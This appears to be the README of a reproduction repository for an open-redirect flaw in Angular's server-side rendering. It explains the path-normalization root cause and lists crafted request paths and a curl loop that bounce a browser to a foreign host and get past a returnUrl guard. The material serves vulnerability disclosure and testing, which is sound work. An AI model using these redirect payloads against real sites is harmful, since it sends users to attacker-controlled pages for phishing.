# Angular SSR open redirect repro

On Angular 22.2.0 a single unauthenticated `GET /.;/(//evil.test)` makes `AngularNodeAppEngine`
answer `302 Location: //evil.test`, which a browser resolves as protocol-relative and follows off the
origin.

The Router serializes the navigation to `/.//evil.test`, which starts with `/.` and resolves to the
app's own origin, so neither guard in `ServerPlatformLocation.replaceState()` fires. WHATWG
normalization then pops the preceding segment, leaving `pathname === '//evil.test'`, and
`@angular/ssr` emits that pathname as the redirect target without normalizing it.

## Run

```bash
npm ci
npm run build
PORT=4000 node dist/router-open-redirect/server/server.mjs
```

## URLs to check

| URL | Expected |
| --- | --- |
| http://localhost:4000/.;/(//evil.test) | `302` → `http://evil.test/`, **left the origin** |
| http://localhost:4000/%2e;/(/\evil.test) | `302` → `http://evil.test/`, same with no `.` or `//` in the request |
| http://localhost:4000/xx;/(//evil.test) | `302` → `/xx//evil.test`, control, stays on the origin |
| http://localhost:4000/login?returnUrl=%2F.%3B%2F(%2F%2Fevil.test) | `302` → `http://evil.test/`, **the guard accepted it** |
| http://localhost:4000/login?returnUrl=https%3A%2F%2Fevil.test | `200`, no redirect, the guard rejected it |
| http://localhost:4000/acme | `200`, normal traffic |

In a browser the confirmation is the address bar showing `evil.test` with a DNS error. `.test` is
reserved by RFC 2606 and never resolves, so nothing real is contacted.

With curl, `%{redirect_url}` prints where the client would actually go:

```bash
for p in '/.;/(//evil.test)' '/xx;/(//evil.test)' '/login?returnUrl=%2F.%3B%2F(%2F%2Fevil.test)'; do
  printf '%-46s ' "$p"
  curl -s -o /dev/null -w '%{http_code}  %{redirect_url}\n' --path-as-is "http://localhost:4000$p"
done
```

On Windows PowerShell use `curl.exe` and single-quote the URL.

## Notes

`returnUrlGuard` in [src/app/app.routes.ts](src/app/app.routes.ts) is the canonical open-redirect
check (relative path, not protocol-relative), and the fourth row above is it being bypassed.

The config also carries the route shapes that are *not* affected: childless parameter routes,
children without a `**`, a `**` child using `redirectTo`, and depth 3. The boundary is checkable
against the same build.
